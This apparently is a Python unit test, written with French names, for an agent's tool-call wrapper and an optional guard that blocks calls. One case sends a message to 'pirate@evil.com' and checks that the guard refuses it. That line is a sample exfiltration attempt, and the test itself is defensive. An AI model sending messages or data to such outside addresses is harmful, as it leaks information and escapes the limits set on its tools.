from agent.outils import Outils

def test_outils_et_garde():

    o = Outils()
    res_doc = o.appeler("lire_document", {"id": "doc_conges"})
    assert res_doc is not None, "La lecture du document ne doit pas renvoyer None."
    
    o.appeler("envoyer_message", {"destinataire": "rh@entreprise.fr", "texte": "hello"})
   
    assert len(o.appels) == 2, f"Attendu 2 appels enregistrés, obtenu {len(o.appels)}"
    assert o.appels[0]["outil"] == "lire_document"
    assert o.appels[1]["outil"] == "envoyer_message"
    assert not o.appels[1].get("bloque", False), "L'appel ne devrait pas être bloqué sans garde."

    def garde_fictive(nom, args):
        if nom == "envoyer_message":
            return "destinataire non autorisé"
        return None

    o2 = Outils(garde=garde_fictive)
    res_bloque = o2.appeler("envoyer_message", {"destinataire": "pirate@evil.com", "texte": "x"})
    
    assert "destinataire non autorisé" in res_bloque, f"Attendu le refus de la garde, obtenu : {res_bloque}"
    assert len(o2.appels) == 1
    assert o2.appels[0]["bloque"] is True, "L'appel bloqué par la garde doit obligatoirement avoir l'attribut bloque=True."